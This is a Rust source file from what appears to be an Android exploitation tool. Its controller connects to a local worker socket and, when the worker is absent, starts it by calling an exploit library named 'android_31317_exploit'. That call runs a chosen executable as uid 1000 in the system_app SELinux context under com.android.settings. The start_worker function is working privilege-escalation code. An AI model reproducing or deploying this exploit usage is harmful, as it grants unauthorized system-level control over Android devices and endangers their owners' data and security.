use std::{io::ErrorKind, path::PathBuf, thread::sleep, time::Duration};

use android_31317_exploit::exploit::{ExploitKind, TriggerApp, build_and_execute};

use crate::{error::Error, protocol::DataFrame, socket::connect_worker};

pub struct Controller {}

impl Controller {
    pub fn create(executable: PathBuf) -> Result<(), Error> {
        let mut worker_socket = match connect_worker() {
            Ok(socket) => Ok(socket),
            Err(error) => match error.kind() {
                ErrorKind::ConnectionRefused => {
                    // Worker isn't alive, attempt to start
                    warn!("Worker doesn't appear to be alive. Attempting to start");
                    match start_worker(executable) {
                        Ok(_) => {
                            // Started. Wait short period and attempt to connect
                            warn!("Worker started");
                            sleep(Duration::from_millis(200));
                            connect_worker()
                        }
                        Err(error) => {
                            error!("Unable to start worker. Failing. {error}");
                            Err(error)?
                        }
                    }
                }
                _ => Err(error),
            },
        }?;

        worker_socket.set_read_timeout(None)?;

        DataFrame::new("Hello world".into()).send(&mut worker_socket)?;

        worker_socket.shutdown(std::net::Shutdown::Both)?;

        Ok(())
    }
}

fn start_worker(executable: PathBuf) -> Result<(), Error> {
    Ok(build_and_execute(
        1000,
        "/data/",
        "com.android.settings",
        "platform:system_app:targetSdkVersion=29:complete",
        &ExploitKind::Command(format!("{} worker", executable.display())),
        &TriggerApp::new(
            "com.android.settings".into(),
            "com.android.settings.Settings".into(),
        ),
        None,
    )?)
}
